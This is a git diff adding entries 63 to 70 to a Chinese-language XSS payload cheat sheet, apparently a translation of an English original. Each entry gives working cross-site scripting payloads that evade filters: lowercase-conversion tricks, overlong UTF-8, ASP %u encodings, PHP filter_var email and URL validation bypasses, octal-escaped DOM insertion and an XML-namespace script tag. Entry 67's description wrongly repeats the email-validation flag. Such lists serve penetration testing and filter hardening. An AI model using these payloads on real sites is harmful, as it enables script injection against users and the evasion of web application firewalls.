@@ -454,6 +454,53 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 <!--
 %0A-->
 ```
+**63.JS Lowercased Input (javascript小写输入)** <br>
+以下payload用于当目标应用程序通过javascript将输入转换为小写时使用。它也可以用于服务器端的小写操作。 <br>
+```
+<SCRİPT>alert(1)</SCRİPT>
+<SCRİPT/SRC=data:,alert(1)>
+```
+**64.Overlong UTF-8 (超长UTF-8)** <br>
+以下payload用于当目标应用程序执行最佳匹配标签时使用。 <br>
+```
+%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
+```
+**65.Vectors Exclusive for ASP Pages (ASP网页专用payload)** <br>
+以下payload用于绕过.asp页中的`<[alpha]`筛选。<br>
+```
+%u003Csvg onload=alert(1)>
+%u3008svg onload=alert(2)>
+%uFF1Csvg onload=alert(3)>
+```
+**66.PHP Email Validation Bypass (PHP电子邮件验证绕过)** <br>
+以下payload用于绕过PHP的`FILTER_var()`函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。<br>
+```
+"><svg/onload=alert(1)>"@x.y
+```
+**67.PHP URL Validation Bypass (PHP URL验证绕过)** <br>
+以下payload用于绕过PHP的`FILTER_var()`函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。<br>
+```
+javascript://%250Aalert(1)
+```
+**68.PHP URL Validation Bypass – Query Required (PHP URL验证绕过-需要查询)** <br>
+以下payload用于绕过PHP需要筛选标志查询(FILTER_FLAG_QUERY_REQUIRED),筛选验证电子邮件(FILTER_VALIDATE_EMAIL)的`filter_var()`函数。<br>
+```
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+(with domain filter)
+javascript://https://DOMAIN/%250A1?alert(1):0
+```
+**69.DOM Insertion via Server Side Reflection (通过服务器端反射插入DOM)** <br>
+以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和WAF,插入到DOM中。<br>
+```
+\74svg o\156load\75alert\501\51\76
+```
+**70.XML-Based Vector for Bypass (基于XML的绕过)** <br>
+以下payload用于在XML网页中绕过浏览器筛选和WAF。<br>
+如果输入插入到了注释节点中，则在payload前加一个"->"，如果输入落在`CDATA`节中，则在有效负载前加一个"]]>"。
+```
+<_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
+```
 
 ## 致谢
 **英文议题作者：** <br>
